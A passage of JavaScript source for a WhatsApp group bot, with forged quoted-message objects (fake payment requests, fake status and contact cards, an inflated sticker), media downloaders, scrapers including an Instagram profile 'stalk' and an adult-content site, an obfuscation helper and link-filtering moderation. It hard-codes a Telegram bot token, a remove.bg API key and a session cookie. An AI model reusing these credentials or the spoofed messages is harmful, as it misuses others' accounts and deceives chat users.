          noteMessage: { extendedTextMessage: { text: global.botname } },
          expiryTimestamp: 999999999,
          amount: { value: 91929291929, offset: 1000, currencyCode: "USD" },
        },
      },
    };
    const ftroli = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast",
      },
      message: {
        orderMessage: {
          itemCount: 2022,
          status: 200,
          thumbnail: thumb,
          surface: 200,
          message: botname,
          orderTitle: ownername,
          sellerJid: "0@s.whatsapp.net",
        },
      },
      contextInfo: { forwardingScore: 999, isForwarded: true },
      sendEphemeral: true,
    };
    const fdoc = {
      key: {
        participant: "0@s.whatsapp.net",
        ...(m.chat ? { remoteJid: `status@broadcast` } : {}),
      },
      message: { documentMessage: { title: botname, jpegThumbnail: thumb } },
    };
    const fvn = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
      },
      message: {
        audioMessage: {
          mimetype: "audio/ogg; codecs=opus",
          seconds: 359996400,
          ptt: "true",
        },
      },
    };
    const fgif = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
      },
      message: {
        videoMessage: {
          title: botname,
          h: wm,
          seconds: "359996400",
          gifPlayback: "true",
          caption: ownername,
          jpegThumbnail: thumb,
        },
      },
    };
    const fgclink = {
      key: { participant: "0@s.whatsapp.net", remoteJid: "0@s.whatsapp.net" },
      message: {
        groupInviteMessage: {
          groupJid: "6288213840883-1616169743@g.us",
          inviteCode: "m",
          groupName: wm,
          caption: `${pushname}`,
          jpegThumbnail: thumb,
        },
      },
    };
    const fvideo = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
      },
      message: {
        videoMessage: {
          title: botname,
          h: wm,
          seconds: "359996400",
          caption: `${pushname}`,
          jpegThumbnail: thumb,
        },
      },
    };
    const floc = {
      key: {
        participant: "0@s.whatsapp.net",
        ...(m.chat ? { remoteJid: `status@broadcast` } : {}),
      },
      message: { locationMessage: { name: wm, jpegThumbnail: thumb } },
    };
    const fkontak = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: `status@broadcast` } : {}),
      },
      message: {
        contactMessage: {
          displayName: ownername,
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=916909137213:916909137213\nitem1.X-ABLabel:Mobile\nEND:VCARD`,
          jpegThumbnail: thumb,
          thumbnail: thumb,
          sendEphemeral: true,
        },
      },
    };
    const fakestatus = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
      },
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
          mimetype: "image/jpeg",
          caption: wm,
          fileSha256: "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
          fileLength: "28777",
          height: 1080,
          width: 1079,
          mediaKey: "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
          fileEncSha256: "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
          directPath:
            "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
          mediaKeyTimestamp: "1610993486",
          jpegThumbnail: fs.readFileSync("./NhdMedia/theme/cheemspic.jpg"),
          scansSidecar:
            "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==",
        },
      },
    };

    if (isCmd && isBanned) {
      return banRep();
    }

    let list = [];
    for (let i of owner) {
      list.push({
        displayName: await NhdBotFunc.getName(i),
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await NhdBotFunc.getName(
          i
        )}\nFN:${await NhdBotFunc.getName(
          i
        )}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
      });
    }

    const repPy = {
      key: {
        remoteJid: "0@s.whatsapp.net",
        fromMe: false,
        id: `${ownername}`,
        participant: "0@s.whatsapp.net",
      },
      message: {
        requestPaymentMessage: {
          currencyCodeIso4217: "USD",
          amount1000: 999999999,
          requestFrom: "0@s.whatsapp.net",
          noteMessage: {
            extendedTextMessage: {
              text: `${botname}`,
            },
          },
          expiryTimestamp: 999999999,
          amount: {
            value: 91929291929,
            offset: 1000,
            currencyCode: "INR",
          },
        },
      },
    };

    //let nhdrecordin = ['recording','composing']
    //let nhdrecordinfinal = nhdrecordin[Math.floor(Math.random() * nhdrecordin.length)]

    const pickRandom = (arr) => {
      return arr[Math.floor(Math.random() * arr.length)];
    };

    const downloadMp4 = async (Link) => {
      let gHz = require("./scrape/savefrom");
      let Lehd = await gHz.savefrom(Link);
      let ghd = await reSize(Lehd.thumb, 300, 300);
      let ghed = await ytdl.getInfo(Link);
      let gdyr = await NhdBotFunc.sendMessage(
        from,
        {
          image: { url: Lehd.thumb },
          caption: `Channel Name : ${ghed.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${ghed.player_response.videoDetails.channelId}
Title : ${Lehd.meta.title}
Duration : ${Lehd.meta.duration}
Desc : ${ghed.player_response.videoDetails.shortDescription}`,
        },
        { quoted: m }
      );
      try {
        await ytdl.getInfo(Link);
        let mp4File = getRandom(".mp4");
        console.log(color("Download Video With ytdl-core"));
        let nana = ytdl(Link)
          .pipe(fs.createWriteStream(mp4File))
          .on("finish", async () => {
            await NhdBotFunc.sendMessage(
              from,
              {
                video: fs.readFileSync(mp4File),
                caption: mess.succes,
                gifPlayback: false,
              },
              { quoted: gdyr }
            );
            fs.unlinkSync(`./${mp4File}`);
          });
      } catch (err) {
        m.reply(`${err}`);
      }
    };

    const downloadMp3 = async (Link) => {
      let pNx = require("./scrape/savefrom");
      let Puxa = await pNx.savefrom(Link);
      let MlP = await reSize(Puxa.thumb, 300, 300);
      let PlXz = await ytdl.getInfo(Link);
      let gedeyeer = await NhdBotFunc.sendMessage(
        from,
        {
          image: { url: Puxa.thumb },
          caption: `Channel Name : ${PlXz.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${PlXz.player_response.videoDetails.channelId}
Title : ${Puxa.meta.title}
Duration : ${Puxa.meta.duration}
Desc : ${PlXz.player_response.videoDetails.shortDescription}`,
        },
        { quoted: m }
      );
      try {
        await ytdl.getInfo(Link);
        let mp3File = getRandom(".mp3");
        console.log(color("Download Audio With ytdl-core"));
        ytdl(Link, { filter: "audioonly" })
          .pipe(fs.createWriteStream(mp3File))
          .on("finish", async () => {
            await NhdBotFunc.sendMessage(
              from,
              { audio: fs.readFileSync(mp3File), mimetype: "audio/mp4" },
              { quoted: gedeyeer }
            );
            fs.unlinkSync(mp3File);
          });
      } catch (err) {
        m.reply(`${err}`);
      }
    };

    async function sendPoll(jid, text, list) {
      NhdBotFunc.relayMessage(
        jid,
        {
          pollCreationMessage: {
            name: text,
            options: list.map((v) => {
              return { optionName: v };
            }),
            selectableOptionsCount: list.length,
          },
        },
        {}
      );
    }

    async function Telesticker(url) {
      return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi))
          return replygcnhd("Enther your url telegram sticker link");
        packName = url.replace("https://t.me/addstickers/", "");
        data = await axios(
          `https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(
            packName
          )}`,
          { method: "GET", headers: { "User-Agent": "GoogleBot" } }
        );
        const nhdyresult = [];
        for (let i = 0; i < data.data.result.stickers.length; i++) {
          fileId = data.data.result.stickers[i].thumb.file_id;
          data2 = await axios(
            `https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`
          );
          result = {
            status: 200,
            author: "DGNhd",
            url:
              "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" +
              data2.data.result.file_path,
          };
          nhdyresult.push(result);
        }
        resolve(nhdyresult);
      });
    }

    async function rmbg(buffer) {
      let form = new FormData();
      form.append("size", "auto");
      form.append("image_file", fs.createReadStream(buffer), "ntah.webp");
      let res = await axios({
        url: "https://api.remove.bg/v1.0/removebg",
        method: "POST",
        data: form,
        responseType: "arraybuffer",
        headers: {
          "X-Api-Key": "dNaWDqPDEuzQTHDba6TACk57",
          ...form.getHeaders(),
        },
      });
      return res.data;
    }

    async function ephoto(url, texk) {
      let form = new FormData();
      let gT = await axios.get(url, {
        headers: {
          "user-agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
        },
      });
      let $ = cheerio.load(gT.data);
      let text = texk;
      let token = $("input[name=token]").val();
      let build_server = $("input[name=build_server]").val();
      let build_server_id = $("input[name=build_server_id]").val();
      form.append("text[]", text);
      form.append("token", token);
      form.append("build_server", build_server);
      form.append("build_server_id", build_server_id);
      let res = await axios({
        url: url,
        method: "POST",
        data: form,
        headers: {
          Accept: "*/*",
          "Accept-Language": "en-US,en;q=0.9",
          "user-agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
          cookie: gT.headers["set-cookie"]?.join("; "),
          ...form.getHeaders(),
        },
      });
      let $$ = cheerio.load(res.data);
      let json = JSON.parse($$("input[name=form_value_input]").val());
      json["text[]"] = json.text;
      delete json.text;
      let { data } = await axios.post(
        "https://en.ephoto360.com/effect/create-image",
        new URLSearchParams(json),
        {
          headers: {
            "user-agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
            cookie: gT.headers["set-cookie"].join("; "),
          },
        }
      );
      return build_server + data.image;
    }

    async function quotesanime() {
      return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 184);
        axios
          .get("https://otakotaku.com/quote/feed/" + page)
          .then(({ data }) => {
            const $ = cheerio.load(data);
            const hasil = [];
            $("div.kotodama-list").each(function (l, h) {
              hasil.push({
                link: $(h).find("a").attr("href"),
                gambar: $(h).find("img").attr("data-src"),
                karakter: $(h).find("div.char-name").text().trim(),
                anime: $(h).find("div.anime-title").text().trim(),
                episode: $(h).find("div.meta").text(),
                up_at: $(h).find("small.meta").text(),
                quotes: $(h).find("div.quote").text().trim(),
              });
            });
            resolve(hasil);
          })
          .catch(reject);
      });
    }

    async function obfus(query) {
      return new Promise((resolve, reject) => {
        try {
          const obfuscationResult = jsobfus.obfuscate(query, {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1,
          });
          const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode(),
          };
          resolve(result);
        } catch (e) {
          reject(e);
        }
      });
    }

    async function styletext(teks) {
      return new Promise((resolve, reject) => {
        axios
          .get("http://qaz.wtf/u/convert.cgi?text=" + teks)
          .then(({ data }) => {
            let $ = cheerio.load(data);
            let hasil = [];
            $("table > tbody > tr").each(function (a, b) {
              hasil.push({
                name: $(b).find("td:nth-child(1) > span").text(),
                result: $(b).find("td:nth-child(2)").text().trim(),
              });
            });
            resolve(hasil);
          });
      });
    }

    async function hentaivid() {
      return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 1153);
        axios.get("https://sfmcompile.club/page/" + page).then((data) => {
          const $ = cheerio.load(data.data);
          const hasil = [];
          $("#primary > div > div > ul > li > article").each(function (a, b) {
            hasil.push({
              title: $(b).find("header > h2").text(),
              link: $(b).find("header > h2 > a").attr("href"),
              category: $(b)
                .find("header > div.entry-before-title > span > span")
                .text()
                .replace("in ", ""),
              share_count: $(b)
                .find("header > div.entry-after-title > p > span.entry-shares")
                .text(),
              views_count: $(b)
                .find("header > div.entry-after-title > p > span.entry-views")
                .text(),
              type: $(b).find("source").attr("type") || "image/jpeg",
              video_1:
                $(b).find("source").attr("src") ||
                $(b).find("img").attr("data-src"),
              video_2: $(b).find("video > a").attr("href") || "",
            });
          });
          resolve(hasil);
        });
      });
    }

    async function GetBuffer(url) {
      return new Promise(async (resolve, reject) => {
        let buffer;
        await jimp
          .read(url)
          .then((image) => {
            image.getBuffer(image._originalMime, function (err, res) {
              buffer = res;
            });
          })
          .catch(reject);
        if (!Buffer.isBuffer(buffer)) reject(false);
        resolve(buffer);
      });
    }
    function GetType(Data) {
      return new Promise((resolve, reject) => {
        let Result, Status;
        if (Buffer.isBuffer(Data)) {
          Result = new Buffer.from(Data).toString("base64");
          Status = 0;
        } else {
          Status = 1;
        }
        resolve({
          status: Status,
          result: Result,
        });
      });
    }
    async function Cartoon(url) {
      return new Promise(async (resolve, reject) => {
        let Data;
        try {
          let buffer = await GetBuffer(url);
          let Base64 = await GetType(buffer);
          await axios
            .request({
              url: "https://access1.imglarger.com/PhoAi/Upload",
              method: "POST",
              headers: {
                connection: "keep-alive",
                accept: "application/json, text/plain, */*",
                "content-type": "application/json",
              },
              data: JSON.stringify({
                type: 11,
                base64Image: Base64.result,
              }),
            })
            .then(async ({ data }) => {
              let code = data.data.code;
              let type = data.data.type;
              while (true) {
                let LopAxios = await axios.request({
                  url: "https://access1.imglarger.com/PhoAi/CheckStatus",
                  method: "POST",
                  headers: {
                    connection: "keep-alive",
                    accept: "application/json, text/plain, */*",
                    "content-type": "application/json",
                  },
                  data: JSON.stringify({
                    code: code,
                    isMember: 0,
                    type: type,
                  }),
                });
                let status = LopAxios.data.data.status;
                if (status == "success") {
                  Data = {
                    message: "success",
                    download: {
                      full: LopAxios.data.data.downloadUrls[0],
                      head: LopAxios.data.data.downloadUrls[1],
                    },
                  };
                  break;
                } else if (status == "noface") {
                  Data = {
                    message: "noface",
                  };
                  break;
                }
              }
            });
        } catch (_error) {
          Data = false;
        } finally {
          if (Data == false) {
            reject(false);
          }
          resolve(Data);
        }
      });
    }
    function randomId() {
      return Math.floor(100000 + Math.random() * 900000);
    }

    async function igstalk(Username) {
      return new Promise((resolve, reject) => {
        axios
          .get("https://dumpor.com/v/" + Username, {
            headers: {
              cookie:
                "_inst_key=SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYWGhnNS1uWVNLUU81V1lzQ01MTVY2R0h1.fI2xB2dYYxmWqn7kyCKIn1baWw3b-f7QvGDfDK2WXr8",
              "user-agent":
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
            },
          })
          .then((res) => {
            const $ = cheerio.load(res.data);
            const result = {
              profile: $(
                "#user-page > div.user > div.row > div > div.user__img"
              )
                .attr("style")
                .replace(/(background-image: url\(\'|\'\);)/gi, ""),
              fullname: $(
                "#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > a > h1"
              ).text(),
              username: $(
                "#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > h4"
              ).text(),
              post: $(
                "#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(1)"
              )
                .text()
                .replace(" Posts", ""),
              followers: $(
                "#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(2)"
              )
                .text()
                .replace(" Followers", ""),
              following: $(
                "#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(3)"
              )
                .text()
                .replace(" Following", ""),
              bio: $(
                "#user-page > div.user > div > div.col-md-5.my-3 > div"
              ).text(),
            };
            resolve(result);
          });
      });
    }

    async function replyprem(teks) {
      m.reply(
        `This feature is for premium user, contact the owner to become premium user`
      );
    }

    // Autosticker gc
    if (isAutoSticker) {
      if (/image/.test(mime) && !/webp/.test(mime)) {
        let mediac = await quoted.download();
        await NhdBotFunc.sendImageAsSticker(from, mediac, m, {
          packname: global.packname,
          author: global.author,
        });
        console.log(`Auto sticker detected`);
      } else if (/video/.test(mime)) {
        if ((quoted.msg || quoted).seconds > 11) return;
        let mediac = await quoted.download();
        await NhdBotFunc.sendVideoAsSticker(from, mediac, m, {
          packname: global.packname,
          author: global.author,
        });
      }
    }

    // Anti Link
    if (Antilinkgc) {
      if (budy.match(`chat.whatsapp.com`)) {
        if (!isBotAdmins) return NhdStickBotAdmin();
        let gclink =
          `https://chat.whatsapp.com/` +
          (await NhdBotFunc.groupInviteCode(m.chat));
        let isLinkThisGc = new RegExp(gclink, "i");
        let isgclink = isLinkThisGc.test(m.chat);
        if (isgclink)
          return NhdBotFunc.sendMessage(m.chat, {
            text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nYou won't be kicked by a bot because what you send is a link to this group`,
          });
        if (isAdmins)
          return NhdBotFunc.sendMessage(m.chat, {
            text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to post any link`,
          });
        if (NhdTheCreator)
          return NhdBotFunc.sendMessage(m.chat, {
            text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nOwner has sent a link, owner is free to post any link`,
          });
        kice = m.sender;
        await NhdBotFunc.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        NhdBotFunc.sendMessage(
          from,
          {
            text: `\`\`\`「 Group Link Detected 」\`\`\`\n\n@${
              kice.split("@")[0]
            } Has been kicked because of sending group link in this group`,
            contextInfo: { mentionedJid: [kice] },
          },
          { quoted: m }
        );
      }
    }

    // Antiwame by nhd
    if (antiWame)
      if (budy.includes(`Wa.me`)) {
        if (!isBotAdmins) return;
        bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`;
        if (isAdmins) return m.reply(bvl);
        if (m.key.fromMe) return m.reply(bvl);
        if (NhdTheCreator) return m.reply(bvl);
        kice = m.sender;
        await NhdBotFunc.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        NhdBotFunc.sendMessage(
          from,
          {
            text: `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${
              kice.split("@")[0]
            } has sent wa.me link and successfully deleted`,
            contextInfo: { mentionedJid: [kice] },
          },
          { quoted: m }
        );
      } else {
      }
    if (antiWame)
      if (budy.includes(`http://wa.me`)) {
        if (!isBotAdmins) return;
        bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`;
        if (isAdmins) return m.reply(bvl);
        if (m.key.fromMe) return m.reply(bvl);
        if (NhdTheCreator) return m.reply(bvl);
        kice = m.sender;
        await NhdBotFunc.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        NhdBotFunc.groupParticipantsUpdate(m.chat, [m.sender], "remove");
        NhdBotFunc.sendMessage(
          from,
          {
            text: `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${
              kice.split("@")[0]
            } has sent wa me link and successfully deleted`,
            contextInfo: { mentionedJid: [kice] },
          },
          { quoted: m }
        );
      } else {
      }
    //antivirtex by nhd
    if (antiVirtex) {
      if (budy.length > 3500) {
        if (!isBotAdmins) return NhdStickBotAdmin();
        await NhdBotFunc.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        NhdBotFunc.groupParticipantsUpdate(m.chat, [m.sender], "remove");
        NhdBotFunc.sendMessage(
          from,
          {
            text: `\`\`\`「 Virus Detected 」\`\`\`\n\n@${
              m.sender.split("@")[0]
            } Has been kicked because of sending virus in this group`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      }
    }
    //anti bad words by nhd
    if (antiToxic) {
      for (let bak of BadNhd) {
        if (budy === bak) {
          NhdBotFunc.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
          NhdBotFunc.sendMessage(
            from,
            {
              text: `\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${
                m.sender.split("@")[0]
              } was using harsh words and his chat has been deleted`,
              contextInfo: { mentionedJid: [m.sender] },
            },
            { quoted: m }
          );
        }
      }
    }

    //antilink youtube video by nhd
    if (AntiLinkYoutubeVid)
      if (budy.includes("https://youtu.be/")) {
        if (!isBotAdmins) return;
        bvl = `\`\`\`「 YoutTube Video Link Detected 」\`\`\`\n\nAdmin has sent a youtube video link, admin is free to send any link😇`;
        if (isAdmins) return m.reply(bvl);
        if (m.key.fromMe) return m.reply(bvl);
        if (NhdTheCreator) return m.reply(bvl);
        await NhdBotFunc.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        NhdBotFunc.sendMessage(
          from,
          {
            text: `\`\`\`「 YouTube Video Link Detected 」\`\`\`\n\n@${
              m.sender.split("@")[0]
            } has sent a link and successfully deleted`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      } else {
      }
    //antilink youtube channel by nhd
    if (AntiLinkYoutubeChannel)
      if (budy.includes("https://youtube.com/")) {
        if (!isBotAdmins) return;
        bvl = `\`\`\`「 YoutTube Channel Link Detected 」\`\`\`\n\nAdmin has sent a youtube channel link, admin is free to send any link😇`;
        if (isAdmins) return m.reply(bvl);
        if (m.key.fromMe) return m.reply(bvl);
        if (NhdTheCreator) return m.reply(bvl);
        await NhdBotFunc.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        NhdBotFunc.sendMessage(
          from,
          {
            text: `\`\`\`「 YouTube Channel Link Detected 」\`\`\`\n\n@${
              m.sender.split("@")[0]
            } has sent a link and successfully deleted`,
            contextInfo: { mentionedJid: [m.sendet] },
          },
          { quoted: m }
        );
      } else {
      }
    //antilink instagram by nhd
    if (AntiLinkInstagram)
      if (budy.includes("https://www.instagram.com/")) {
        if (!isBotAdmins) return;
        bvl = `\`\`\`「 Instagram Link Detected 」\`\`\`\n\nAdmin has sent a instagram link, admin is free to send any link😇`;
        if (isAdmins) return m.reply(bvl);
        if (m.key.fromMe) return m.reply(bvl);
        if (NhdTheCreator) return m.reply(bvl);
        await NhdBotFunc.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        NhdBotFunc.sendMessage(
          from,
          {
            text: `\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${
              m.sender.split("@")[0]
            } has sent a link and successfully deleted`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      } else {
      }
    //antilink facebook by nhd
    if (AntiLinkFacebook)
      if (budy.includes("https://facebook.com/")) {
        if (!isBotAdmins) return;
        bvl = `\`\`\`「 Facebook Link Detected 」\`\`\`\n\nAdmin has sent a facebook link, admin is free to send any link😇`;
        if (isAdmins) return m.reply(bvl);
        if (m.key.fromMe) return m.reply(bvl);
        if (NhdTheCreator) return m.reply(bvl);
        await NhdBotFunc.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        NhdBotFunc.sendMessage(
          from,
          {
            text: `\`\`\`「 Facebook Link Detected 」\`\`\`\n\n@${
              m.sender.split("@")[0]
            } has sent a link and successfully deleted`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      } else {
      }
    //antilink telegram by nhd
    if (AntiLinkTelegram)
      if (budy.includes("https://t.me/")) {
        if (AntiLinkTelegram) if (!isBotAdmins) return;
        bvl = `\`\`\`「 Telegram Link Detected 」\`\`\`\n\nAdmin has sent a telegram link, admin is free to send any link😇`;
        if (isAdmins) return m.reply(bvl);
        if (m.key.fromMe) return m.reply(bvl);
        if (NhdTheCreator) return m.reply(bvl);
        await NhdBotFunc.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        NhdBotFunc.sendMessage(
          from,
          {
            text: `\`\`\`「 Telegram Link Detected 」\`\`\`\n\n@${
              m.sender.split("@")[0]
            } has sent a link and successfully deleted`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      } else {
      }
    //antilink tiktok by nhd
    if (AntiLinkTiktok)
      if (budy.includes("https://www.tiktok.com/")) {
        if (!isBotAdmins) return;
        bvl = `\`\`\`「 Tiktok Link Detected 」\`\`\`\n\nAdmin has sent a tiktok link, admin is free to send any link😇`;
        if (isAdmins) return m.reply(bvl);
        if (m.key.fromMe) return m.reply(bvl);
        if (NhdTheCreator) return m.reply(bvl);
        await NhdBotFunc.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        NhdBotFunc.sendMessage(
          from,
          {
            text: `\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${
              m.sender.split("@")[0]
            } has sent a link and successfully deleted`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      } else {
      }
    //antilink twitter by nhd
    if (AntiLinkTwitter)
      if (budy.includes("https://twitter.com/")) {
        if (!isBotAdmins) return;
        bvl = `\`\`\`「 Twitter Link Detected 」\`\`\`\n\nAdmin has sent a twitter link, admin is free to send any link😇`;
        if (isAdmins) return m.reply(bvl);
        if (m.key.fromMe) return m.reply(bvl);
        if (NhdTheCreator) return m.reply(bvl);
        await NhdBotFunc.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        NhdBotFunc.sendMessage(
          from,
          {
            text: `\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${
              m.sender.split("@")[0]
            } has sent a link and successfully deleted`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      } else {
      }
    //antilink all by nhd
    if (AntiLinkAll)
      if (budy.includes("https://")) {
        if (!isBotAdmins) return;
        bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`;
        if (isAdmins) return m.reply(bvl);
        if (m.key.fromMe) return m.reply(bvl);
        if (NhdTheCreator) return m.reply(bvl);
        await NhdBotFunc.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        NhdBotFunc.sendMessage(
          from,
          {
            text: `\`\`\`「 Link Detected 」\`\`\`\n\n@${
              m.sender.split("@")[0]
            } has sent a link and successfully deleted`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      } else {
      }

    //menu thingy
    const timestamp = speed();
    const latensi = speed() - timestamp;
    const mark = "0@s.whatsapp.net";

    //menu image randomizer
    let picaks = [flaming, fluming, flarun, flasmurf];
    let picak = picaks[Math.floor(Math.random() * picaks.length)];

    //emote
    const emote = (satu, dua) => {
      try {
        const { EmojiAPI } = require("emoji-api");
        const emoji = new EmojiAPI();
        emoji.get(satu).then((emoji) => {
          NhdBotFunc.sendMessage(
            from,
            { caption: mess.success, image: { url: emoji.images[dua].url } },
            { quoted: m }
          );
        });
      } catch (e) {
        m.reply(
          "Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji"
        );
      }
    };

    // Respon Cmd with media
    if (
      isMedia &&
      m.msg.fileSha256 &&
      m.msg.fileSha256.toString("base64") in global.db.sticker
    ) {
      let hash = global.db.sticker[m.msg.fileSha256.toString("base64")];
      let { text, mentionedJid } = hash;
      let messages = await generateWAMessage(
        m.chat,
        { text: text, mentions: mentionedJid },
        {
          userJid: NhdBotFunc.user.id,
          quoted: m.quoted && m.quoted.fakeObj,
        }
      );
      messages.key.fromMe = areJidsSameUser(m.sender, NhdBotFunc.user.id);
      messages.key.id = m.key.id;
      messages.pushName = m.pushName;
      if (m.isGroup) messages.participant = m.sender;
      let msg = {
        ...chatUpdate,
        messages: [proto.WebMessageInfo.fromObject(messages)],
        type: "append",
      };
      NhdBotFunc.ev.emit("messages.upsert", msg);
    }

    const kalgans = {
      key: {
        fromMe: [],
        participant: "0@s.whatsapp.net",
        ...(from ? { remoteJid: "" } : {}),
      },

      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
          fileSha256: "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
          fileEncSha256: "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
          mediaKey: "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
          mimetype: "image/webp",
          height: 40,
          width: 40,
          directPath:
            "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
          fileLength: "99999999",
          mediaKeyTimestamp: "16572901099967",
          isAnimated: [],
